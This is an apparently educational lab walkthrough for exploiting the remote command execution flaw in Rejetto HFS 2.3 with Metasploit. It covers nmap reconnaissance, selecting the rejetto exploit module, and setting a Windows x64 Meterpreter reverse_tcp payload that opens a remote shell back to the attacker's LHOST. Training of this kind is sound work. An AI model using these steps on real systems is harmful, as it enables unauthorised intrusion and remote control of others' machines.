# Exploiting a Vulnerable HTTP File Server

+ An HTTP File Server (HFS) is a web server that is designed for file & document sharing.

+ HTTP File Servers typically run on TCP port 80 and utilize the HTTP protocol for underlying communication.

+ Rejetto HFS is a popular free and open source HTTP file server that can be setup on both Windows and Linux.

+ Rejetto HFS V2.3 is vulnerable to a remote command execution attack.

+ MSF has an exploit module that we can utilize to gain access to the target system hosting the HFS.

## Laboratory

This laboratory will include all steps to reconnaissance and enumeration before trying to exploit the HTTP File Server.

- Start the postgresql server by running `service postgresql start`.

- Start the msfconsole and check the database status.

- Create a new workspace and import your nmap scan results. We can name it HFS for this example.

- Set globally the target IP with `setg RHOSTS $TARGET_IP`, do this for the RHOST option as well.

- We will start by performing a simple port scan using nmap from inside the metasploit framework `db_nmap -sS -sV -O $TARGET_IP`. These results will be stored in the msf db. The result will expose a HTTP file server in port 80. Even if it doesn't have the name rejetto on it, we know it by the banner of the service `HttpFileServer httpd 2.3`.

- Now we are going to look for an exploit module with `search type:exploit name:rejetto`. There's only one exploit module for it, select that module.

**Note**: Before proceeding, you can check the HFS in the browser by requesting the target ip address.

- Now we could run it as is, and it will inject the meterpreter payload automatically, as in its options there are the SRVHOST and the SRVPORT which can be used to gain initial access. We can still set an x64 windows meterpreter payload by running `set payload windows/x64/meterpreter/reverse_tcp`. If you display the options again, we can see it now asks for the LHOST and LPORT.

**Note**: The default payload used by the exploit module is the x86 version, which is good enough, but we can change it to x64.

- Run the module to get access using the x64 payload.
